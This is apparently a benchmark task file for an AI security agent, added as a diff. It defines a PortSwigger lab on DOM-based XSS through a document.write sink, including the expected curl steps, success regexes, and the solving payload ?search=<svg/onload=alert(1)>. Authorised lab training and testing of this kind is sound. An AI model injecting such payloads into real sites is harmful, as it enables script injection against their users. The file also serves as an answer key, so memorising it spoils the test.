@@ -1,0 +1,28 @@
+{
+  "slug": "portswigger-xss-dom-1",
+  "title": "PortSwigger Web Security Academy — DOM XSS in document.write sink using source location.search",
+  "source": {
+    "type": "url",
+    "ref": "https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-document-write-sink",
+    "ready_url": "https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-document-write-sink"
+  },
+  "category": "xss",
+  "difficulty": "easy",
+  "owasp_top10_2021": "A03",
+  "expected_chain": [
+    {"tool": "run_command", "rationale": "GET the lab URL to discover the vulnerable script", "required": false},
+    {"tool": "run_command", "rationale": "send the payload via curl to ?search=<svg/onload=alert(1)>", "required": true}
+  ],
+  "flag_pattern": [
+    "Congratulations,?\\s+you\\s+solved\\s+the\\s+lab",
+    "<svg[^>]*onload\\s*=",
+    "document\\.write"
+  ],
+  "wall_budget_seconds": 600,
+  "preconditions": {
+    "docker_required": false,
+    "internet_required": true,
+    "min_kryon_tools": ["run_command"]
+  },
+  "notes": "PortSwigger DOM-XSS introductory lab — the vulnerable line is `document.write(...)` consuming `location.search`. Solver: GET ?search=<svg/onload=alert(1)>. The lab marks itself solved when its tracker JS sees the alert fire; here we just need the markup to land in the response."
+}
